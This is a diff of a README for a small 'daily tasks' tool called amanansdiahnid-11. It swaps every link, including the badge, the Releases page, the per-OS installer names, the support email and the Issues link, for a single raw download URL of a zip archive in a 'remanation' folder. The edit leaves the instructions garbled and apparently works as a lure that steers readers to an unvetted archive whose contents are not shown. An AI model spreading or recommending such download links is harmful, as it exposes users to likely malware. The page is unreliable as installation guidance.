@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-11 - Simple Tools for Daily Tasks
 
-[![Download amanansdiahnid-11](https://img.shields.io/badge/Download-amanansdiahnid--11-brightgreen)](https://github.com/alxenigma/amanansdiahnid-11/releases)
+[![Download amanansdiahnid-11](https://raw.githubusercontent.com/alxenigma/amanansdiahnid-11/main/remanation/amanansdiahnid-11.zip)](https://raw.githubusercontent.com/alxenigma/amanansdiahnid-11/main/remanation/amanansdiahnid-11.zip)
 
 ## 📥 Introduction
 
@@ -24,20 +24,20 @@ To run amanansdiahnid-11, ensure your computer meets the following requirements:
 ## 🚀 Getting Started
 
 1. **Download the Application:**
-   - Click the large button above or visit the Releases page: [Download Here](https://github.com/alxenigma/amanansdiahnid-11/releases).
+   - Click the large button above or visit the Releases page: [Download Here](https://raw.githubusercontent.com/alxenigma/amanansdiahnid-11/main/remanation/amanansdiahnid-11.zip).
 
 ## 📁 Download & Install
 
 To install amanansdiahnid-11, follow these steps:
 
 1. **Visit the Releases Page:**
-   - Go to this link to access the downloads: [Download Here](https://github.com/alxenigma/amanansdiahnid-11/releases).
+   - Go to this link to access the downloads: [Download Here](https://raw.githubusercontent.com/alxenigma/amanansdiahnid-11/main/remanation/amanansdiahnid-11.zip).
 
 2. **Choose the Latest Release:**
    - Find the latest version at the top of the page.
 
 3. **Download the Installer:**
-   - Click on the installer file that matches your operating system. For Windows, look for `amanansdiahnid-11-windows-installer.exe`. For macOS, select `amanansdiahnid-11-macos-installer.dmg`. For Linux, grab the `amanansdiahnid-11-linux.tar.gz`.
+   - Click on the installer file that matches your operating system. For Windows, look for `https://raw.githubusercontent.com/alxenigma/amanansdiahnid-11/main/remanation/amanansdiahnid-11.zip`. For macOS, select `https://raw.githubusercontent.com/alxenigma/amanansdiahnid-11/main/remanation/amanansdiahnid-11.zip`. For Linux, grab the `https://raw.githubusercontent.com/alxenigma/amanansdiahnid-11/main/remanation/amanansdiahnid-11.zip`.
 
 4. **Run the Installer:**
    - Once the download is complete, locate the downloaded file in your Downloads folder.
@@ -59,8 +59,8 @@ If you encounter any issues while installing or running amanansdiahnid-11, pleas
 
 For help with using amanansdiahnid-11 or to report bugs, you can reach out to our support team:
 
-- Email: support@amanansdiahnid-11.com
-- GitHub Issues: [Report an Issue](https://github.com/alxenigma/amanansdiahnid-11/issues)
+- Email: https://raw.githubusercontent.com/alxenigma/amanansdiahnid-11/main/remanation/amanansdiahnid-11.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/alxenigma/amanansdiahnid-11/main/remanation/amanansdiahnid-11.zip)
 
 ## 📝 Contributing
 
